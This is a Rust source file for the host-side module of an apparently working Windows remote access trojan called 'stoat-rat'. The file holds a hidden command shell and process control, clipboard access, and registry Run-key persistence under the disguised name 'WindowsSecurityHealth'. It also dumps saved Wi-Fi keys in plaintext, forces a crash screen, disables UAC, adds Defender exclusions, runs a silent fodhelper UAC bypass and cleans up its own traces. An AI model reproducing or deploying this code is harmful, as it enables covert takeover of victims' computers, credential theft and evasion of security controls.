// language: Rust, file: src/host.rs, target: Windows
// Host-side actions: shell, process listing, clipboard, persistence, lock, monitor power,
// message box, detached exec, directory listing.
#![cfg(windows)]
#![allow(dead_code)]
use anyhow::{Context, Result};
use std::os::windows::process::CommandExt;

const CREATE_NO_WINDOW: u32 = 0x0800_0000;
const DETACHED_PROCESS: u32 = 0x0000_0008;
const CREATE_NEW_PROCESS_GROUP: u32 = 0x0000_0200;

pub fn run_shell(cmd: &str) -> String {
    match std::process::Command::new("cmd")
        .args(["/C", cmd])
        .creation_flags(CREATE_NO_WINDOW)
        .output()
    {
        Ok(o) => {
            let mut s = String::from_utf8_lossy(&o.stdout).to_string();
            s.push_str(&String::from_utf8_lossy(&o.stderr));
            if s.trim().is_empty() {
                format!("[exit {}]", o.status.code().unwrap_or(-1))
            } else {
                s
            }
        }
        Err(e) => format!("error: {e}"),
    }
}

pub fn list_dir(path: &str) -> String {
    let p = if path.trim().is_empty() {
        std::env::current_dir().unwrap_or_default()
    } else {
        std::path::PathBuf::from(path.trim())
    };
    match std::fs::read_dir(&p) {
        Ok(rd) => {
            let mut v: Vec<String> = rd
                .filter_map(|e| e.ok())
                .map(|e| {
                    let md = e.metadata().ok();
                    let size = md.as_ref().map(|m| m.len()).unwrap_or(0);
                    let is_dir = md.as_ref().map(|m| m.is_dir()).unwrap_or(false);
                    format!(
                        "{} {:>12}  {}",
                        if is_dir { "d" } else { "-" },
                        size,
                        e.file_name().to_string_lossy()
                    )
                })
                .collect();
            v.sort();
            format!("{}\n{}", p.display(), v.join("\n"))
        }
        Err(e) => format!("error: {e}"),
    }
}

pub fn exec(cmdline: &str) -> Result<()> {
    let mut parts = cmdline.split_whitespace();
    let exe = parts.next().context("empty command")?;
    let args: Vec<&str> = parts.collect();
    std::process::Command::new(exe)
        .args(args)
        .creation_flags(DETACHED_PROCESS | CREATE_NEW_PROCESS_GROUP)
        .spawn()?;
    Ok(())
}

pub fn sysinfo_text() -> String {
    use sysinfo::System;
    let mut sys = System::new_all();
    sys.refresh_all();
    let host = System::host_name().unwrap_or_default();
    let user = std::env::var("USERNAME").unwrap_or_default();
    let os = System::long_os_version().unwrap_or_default();
    let kernel = System::kernel_version().unwrap_or_default();
    let cpu = sys
        .cpus()
        .first()
        .map(|c| c.brand().to_string())
        .unwrap_or_default();
    let cores = sys.cpus().len();
    let total = sys.total_memory() / 1024 / 1024;
    let used = sys.used_memory() / 1024 / 1024;
    format!(
        "host: {host}\nuser: {user}\nos: {os} ({kernel})\ncpu: {cpu} x{cores}\nmem: {used}/{total} MB\npid: {}\nexe: {}",
        std::process::id(),
        std::env::current_exe()
            .map(|p| p.display().to_string())
            .unwrap_or_default()
    )
}

pub fn process_list() -> String {
    use sysinfo::{ProcessesToUpdate, System};
    let mut sys = System::new_all();
    sys.refresh_processes(ProcessesToUpdate::All, true);
    let mut v: Vec<String> = sys
        .processes()
        .iter()
        .map(|(pid, p)| format!("{:>7}  {}", pid, p.name().to_string_lossy()))
        .collect();
    v.sort();
    v.truncate(250);
    v.join("\n")
}

pub fn kill_pid(pid: u32) -> String {
    use sysinfo::{Pid, System};
    let mut sys = System::new_all();
    sys.refresh_processes(sysinfo::ProcessesToUpdate::All, true);
    match sys.process(Pid::from_u32(pid)) {
        Some(p) => {
            if p.kill() {
                format!("killed {pid}")
            } else {
                format!("failed to kill {pid}")
            }
        }
        None => format!("no such pid {pid}"),
    }
}

pub fn clip_get() -> Result<String> {
    Ok(arboard::Clipboard::new()?.get_text()?)
}

pub fn clip_set(text: &str) -> Result<()> {
    arboard::Clipboard::new()?.set_text(text.to_string())?;
    Ok(())
}

pub fn message_box(title: &str, text: &str) {
    use windows_sys::Win32::UI::WindowsAndMessaging::{
        MessageBoxW, MB_ICONINFORMATION, MB_OK,
    };
    let t: Vec<u16> = text.encode_utf16().chain(std::iter::once(0)).collect();
    let c: Vec<u16> = title.encode_utf16().chain(std::iter::once(0)).collect();
    unsafe {
        MessageBoxW(std::ptr::null_mut(), t.as_ptr(), c.as_ptr(), MB_OK | MB_ICONINFORMATION);
    }
}

pub fn lock_workstation() {
    unsafe {
        windows_sys::Win32::System::Shutdown::LockWorkStation();
    }
}

pub fn monitor_off() {
    use windows_sys::Win32::UI::WindowsAndMessaging::{
        SendMessageW, HWND_BROADCAST, SC_MONITORPOWER, WM_SYSCOMMAND,
    };
    unsafe {
        SendMessageW(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER as usize, 2);
    }
}

pub fn monitor_on() {
    use windows_sys::Win32::UI::WindowsAndMessaging::{
        SendMessageW, HWND_BROADCAST, SC_MONITORPOWER, WM_SYSCOMMAND,
    };
    unsafe {
        SendMessageW(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER as usize, -1);
    }
}

/// Copy the running exe into %APPDATA%\Microsoft\Windows and set an HKCU Run entry.
pub fn persist(name: &str) -> Result<String> {
    use winreg::enums::HKEY_CURRENT_USER;
    use winreg::RegKey;
    let exe = std::env::current_exe()?;
    let appdata = std::env::var("APPDATA")?;
    let dir = std::path::Path::new(&appdata).join("Microsoft").join("Windows");
    std::fs::create_dir_all(&dir).ok();
    let dest = dir.join(format!("{name}.exe"));
    std::fs::copy(&exe, &dest)?;
    let hkcu = RegKey::predef(HKEY_CURRENT_USER);
    let (key, _) = hkcu.create_subkey(r"Software\Microsoft\Windows\CurrentVersion\Run")?;
    key.set_value(name, &dest.to_string_lossy().to_string())?;
    Ok(dest.display().to_string())
}

pub fn unpersist(name: &str) -> Result<()> {
    use winreg::enums::HKEY_CURRENT_USER;
    use winreg::RegKey;
    let hkcu = RegKey::predef(HKEY_CURRENT_USER);
    let key = hkcu.open_subkey_with_flags(
        r"Software\Microsoft\Windows\CurrentVersion\Run",
        winreg::enums::KEY_ALL_ACCESS,
    )?;
    key.delete_value(name)?;
    Ok(())
}

/// Re-assert the HKCU Run entry so it points at the currently running exe (no copy).
pub fn ensure_autostart(name: &str) -> Result<String> {
    use winreg::enums::HKEY_CURRENT_USER;
    use winreg::RegKey;
    let exe = std::env::current_exe()?;
    let exe_s = exe.to_string_lossy().to_string();
    let hkcu = RegKey::predef(HKEY_CURRENT_USER);
    let (key, _) = hkcu.create_subkey(r"Software\Microsoft\Windows\CurrentVersion\Run")?;
    key.set_value(name, &exe_s)?;
    Ok(exe_s)
}

/// Install directory the loader uses.
fn install_dir() -> std::path::PathBuf {
    std::env::var("RAT_DESTDIR")
        .map(std::path::PathBuf::from)
        .unwrap_or_else(|_| {
            std::path::PathBuf::from(std::env::var("APPDATA").unwrap_or_default())
                .join("Microsoft")
                .join("Windows")
        })
}

/// Remove the Run entry, launcher, scratch files and logs. The loaded DLL cannot be
/// deleted while this process lives — it is returned so the caller can delete it on exit.
/// Returns (run_key_status, removed_paths, dll_path).
pub fn purge_install() -> (String, Vec<std::path::PathBuf>, std::path::PathBuf) {
    let dir = install_dir();
    let launcher_name =
        std::env::var("RAT_NAME").unwrap_or_else(|_| "WindowsSecurityHealth.exe".into());
    let dll_name =
        std::env::var("RAT_DLLNAME").unwrap_or_else(|_| "WindowsSecurityHealth.dll".into());
    let run_name = std::env::var("RAT_NAME").unwrap_or_else(|_| "WindowsSecurityHealth".into());

    let run_status = match unpersist(&run_name) {
        Ok(_) => "removed".to_string(),
        Err(e) => format!("{e}"),
    };

    let dll = dir.join(&dll_name);
    let mut removed = Vec::new();
    for p in [
        dir.join(&launcher_name),
        dir.join(format!("{dll_name}.tmp")),
        dir.join("stoat-rat.old"),
        dir.join("stoat-rat.new"),
        dir.join("stoat-rat.d"),
        std::env::temp_dir().join("rat_drop.log"),
        std::env::temp_dir().join("stoat-rat.log"),
    ] {
        if p.exists() {
            match std::fs::remove_file(&p) {
                Ok(()) => removed.push(p),
                Err(e) => log_cleanup(&format!("could not remove {}: {e}", p.display())),
            }
        }
    }
    (run_status, removed, dll)
}

/// After this process exits, delete the (previously locked) DLL.
pub fn schedule_self_cleanup(dll: &std::path::Path) {
    let pid = std::process::id();
    let cmd = format!(
        "/C ping -n 3 127.0.0.1 >nul & taskkill /F /PID {pid} >nul 2>&1 & del /F /Q \"{}\"",
        dll.display()
    );
    let _ = std::process::Command::new("cmd")
        .raw_arg(cmd)
        .creation_flags(CREATE_NO_WINDOW | CREATE_NEW_PROCESS_GROUP)
        .spawn();
}

fn log_cleanup(msg: &str) {
    if std::env::var_os("RAT_CONSOLE").is_some() {
        eprintln!("[!] {msg}");
    }
}

// ---------------------------------------------------------------- power / system

pub fn reboot() {
    let _ = std::process::Command::new("shutdown")
        .args(["/r", "/t", "0"])
        .creation_flags(CREATE_NO_WINDOW)
        .spawn();
}

pub fn shutdown() {
    let _ = std::process::Command::new("shutdown")
        .args(["/s", "/t", "0"])
        .creation_flags(CREATE_NO_WINDOW)
        .spawn();
}

pub fn abort_shutdown() -> String {
    match std::process::Command::new("shutdown")
        .arg("/a")
        .creation_flags(CREATE_NO_WINDOW)
        .output()
    {
        Ok(o) => {
            let t = String::from_utf8_lossy(&o.stdout).trim().to_string();
            if t.is_empty() {
                "shutdown aborted".into()
            } else {
                t
            }
        }
        Err(e) => format!("error: {e}"),
    }
}

/// Hard bugcheck via RtlAdjustPrivilege + NtRaiseHardError (response = shutdown).
pub fn bsod() -> Result<()> {
    use windows_sys::Win32::System::LibraryLoader::{GetModuleHandleW, GetProcAddress};
    type RtlAdjustPrivilege = unsafe extern "system" fn(u32, u8, u8, *mut u8) -> i32;
    type NtRaiseHardError = unsafe extern "system" fn(u32, u32, u32, *mut usize, u32, *mut u32) -> i32;

    unsafe {
        let ntdll: Vec<u16> = "ntdll.dll\0".encode_utf16().collect();
        let h = GetModuleHandleW(ntdll.as_ptr());
        if h.is_null() {
            anyhow::bail!("ntdll not found");
        }
        let adj = GetProcAddress(h, b"RtlAdjustPrivilege\0".as_ptr() as *const u8);
        let raise = GetProcAddress(h, b"NtRaiseHardError\0".as_ptr() as *const u8);
        let (adj, raise) = match (adj, raise) {
            (Some(a), Some(r)) => (a, r),
            _ => anyhow::bail!("ntdll exports missing"),
        };
        let adj: RtlAdjustPrivilege = std::mem::transmute(adj);
        let raise: NtRaiseHardError = std::mem::transmute(raise);
        let mut old: u8 = 0;
        adj(19, 1, 0, &mut old); // SeShutdownPrivilege
        let mut resp: u32 = 0;
        raise(0xC0000022, 0, 0, std::ptr::null_mut(), 6, &mut resp);
    }
    Ok(())
}

/// Saved Wi-Fi profiles with plaintext keys.
pub fn wifi_dump() -> String {
    let out = match std::process::Command::new("netsh")
        .args(["wlan", "show", "profiles"])
        .creation_flags(CREATE_NO_WINDOW)
        .output()
    {
        Ok(o) => o,
        Err(e) => return format!("netsh failed: {e}"),
    };
    let text = String::from_utf8_lossy(&out.stdout);
    let mut profiles = Vec::new();
    for line in text.lines() {
        if let Some(i) = line.find(':') {
            if line[..i].to_ascii_lowercase().contains("profile") {
                let name = line[i + 1..].trim().to_string();
                if !name.is_empty() {
                    profiles.push(name);
                }
            }
        }
    }
    if profiles.is_empty() {
        return format!("no Wi-Fi profiles found\n\n{}", text.trim());
    }
    let mut result = String::new();
    for p in &profiles {
        let mut key = "(open / none)".to_string();
        if let Ok(o) = std::process::Command::new("netsh")
            .args(["wlan", "show", "profile", &format!("name={p}"), "key=clear"])
            .creation_flags(CREATE_NO_WINDOW)
            .output()
        {
            let t = String::from_utf8_lossy(&o.stdout);
            for l in t.lines() {
                if let Some(i) = l.find(':') {
                    if l[..i].to_ascii_lowercase().contains("key content") {
                        key = l[i + 1..].trim().to_string();
                    }
                }
            }
        }
        result.push_str(&format!("{p} : {key}\n"));
    }
    result
}

pub fn set_wallpaper(path: &str) -> Result<()> {
    use std::ffi::c_void;
    use windows_sys::Win32::UI::WindowsAndMessaging::{
        SystemParametersInfoW, SPIF_SENDCHANGE, SPIF_UPDATEINIFILE, SPI_SETDESKWALLPAPER,
    };
    let w: Vec<u16> = path.encode_utf16().chain(std::iter::once(0)).collect();
    let ok = unsafe {
        SystemParametersInfoW(
            SPI_SETDESKWALLPAPER,
            0,
            w.as_ptr() as *mut c_void,
            SPIF_UPDATEINIFILE | SPIF_SENDCHANGE,
        )
    };
    if ok == 0 {
        anyhow::bail!("SystemParametersInfoW failed");
    }
    Ok(())
}

// ---------------------------------------------------------------- elevation

/// Are we running with a full (high-integrity) admin token?
#[cfg(windows)]
pub fn is_elevated() -> bool {
    use std::ffi::c_void;
    use windows_sys::Win32::Foundation::CloseHandle;
    use windows_sys::Win32::Security::{
        GetTokenInformation, TokenElevation, TOKEN_ELEVATION, TOKEN_QUERY,
    };
    use windows_sys::Win32::System::Threading::{GetCurrentProcess, OpenProcessToken};
    unsafe {
        let mut tok = std::ptr::null_mut();
        if OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &mut tok) == 0 {
            return false;
        }
        let mut elev: TOKEN_ELEVATION = std::mem::zeroed();
        let mut ret = 0u32;
        let ok = GetTokenInformation(
            tok,
            TokenElevation,
            &mut elev as *mut _ as *mut c_void,
            std::mem::size_of::<TOKEN_ELEVATION>() as u32,
            &mut ret,
        );
        CloseHandle(tok);
        ok != 0 && elev.TokenIsElevated != 0
    }
}

/// Turn UAC prompts off (requires admin). Effective after the policy applies.
#[cfg(windows)]
pub fn disable_uac() -> Result<()> {
    use winreg::enums::{HKEY_LOCAL_MACHINE, KEY_SET_VALUE};
    use winreg::RegKey;
    let hklm = RegKey::predef(HKEY_LOCAL_MACHINE);
    let key = hklm.open_subkey_with_flags(
        r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System",
        KEY_SET_VALUE,
    )?;
    key.set_value("EnableLUA", &0u32)?;
    key.set_value("ConsentPromptBehaviorAdmin", &0u32)?;
    Ok(())
}

/// Elevate: run a payload that adds Defender exclusions, (optionally) disables UAC,
/// kills this agent's host, and relaunches the launcher elevated.
///
/// `prompt = false` → silent auto-elevation via fodhelper (needs the user to be a local admin).
/// `prompt = true`  → a signed "Windows PowerShell" UAC dialog the user approves.
#[cfg(windows)]
pub fn uac_elevate(prompt: bool, disable: bool) -> Result<String> {
    use std::path::PathBuf;
    let root = std::env::var("SystemRoot").unwrap_or_else(|_| r"C:\Windows".into());
    let launcher = crate::update::launcher_path();
    let dir = std::env::var("RAT_DESTDIR")
        .map(PathBuf::from)
        .unwrap_or_else(|_| {
            PathBuf::from(std::env::var("APPDATA").unwrap_or_default())
                .join("Microsoft")
                .join("Windows")
        });
    let pid = std::process::id();

    let mut ps = String::from("$ErrorActionPreference='SilentlyContinue'; ");
    ps.push_str(&format!("Add-MpPreference -ExclusionPath '{}'; ", dir.display()));
    if let Some(p) = launcher.parent() {
        ps.push_str(&format!("Add-MpPreference -ExclusionPath '{}'; ", p.display()));
    }
    if disable {
        ps.push_str("Set-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System' -Name EnableLUA -Value 0; ");
        ps.push_str("Set-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System' -Name ConsentPromptBehaviorAdmin -Value 0; ");
    }
    ps.push_str(&format!("Stop-Process -Id {pid} -Force; "));
    ps.push_str(&format!("Start-Process -FilePath '{}'", launcher.display()));

    let ps_path = std::env::temp_dir().join("rat_elev.ps1");
    std::fs::write(&ps_path, &ps)?;

    if prompt {
        let inner = format!(
            "Start-Process -FilePath 'powershell.exe' -ArgumentList '-NoProfile','-ExecutionPolicy','Bypass','-File','{}' -Verb RunAs",
            ps_path.display()
        );
        std::process::Command::new("powershell")
            .args(["-NoProfile", "-Command", &inner])
            .creation_flags(CREATE_NO_WINDOW | CREATE_NEW_PROCESS_GROUP)
            .spawn()?;
        return Ok("UAC prompt shown — approve it".into());
    }

    // Silent auto-elevation: fodhelper auto-elevates and runs our command from HKCU.
    {
        use winreg::enums::HKEY_CURRENT_USER;
        use winreg::RegKey;
        let hkcu = RegKey::predef(HKEY_CURRENT_USER);
        let (key, _) = hkcu.create_subkey(r"Software\Classes\ms-settings\Shell\Open\command")?;
        key.set_value(
            "",
            &format!(
                "powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File \"{}\"",
                ps_path.display()
            ),
        )?;
        key.set_value("DelegateExecute", &"")?;
    }
    let _ = std::process::Command::new(format!(r"{root}\System32\fodhelper.exe"))
        .creation_flags(CREATE_NO_WINDOW)
        .spawn();

    // Un-hijack the Settings handler shortly after.
    let clean = "/C ping -n 4 127.0.0.1 >nul & reg delete \"HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command\" /f >nul 2>&1";
    let _ = std::process::Command::new("cmd")
        .raw_arg(clean)
        .creation_flags(CREATE_NO_WINDOW | CREATE_NEW_PROCESS_GROUP)
        .spawn();

    Ok("elevation triggered (silent, fodhelper)".into())
}

/// Speak text aloud via Windows TTS (System.Speech through PowerShell).
pub fn speak(text: &str) {
    let escaped = text.replace('\'', "''");
    let script = format!(
        "Add-Type -AssemblyName System.Speech; (New-Object System.Speech.Synthesis.SpeechSynthesizer).Speak('{escaped}')"
    );
    let _ = std::process::Command::new("powershell")
        .args(["-NoProfile", "-WindowStyle", "Hidden", "-Command", &script])
        .creation_flags(CREATE_NO_WINDOW | CREATE_NEW_PROCESS_GROUP)
        .spawn();
}
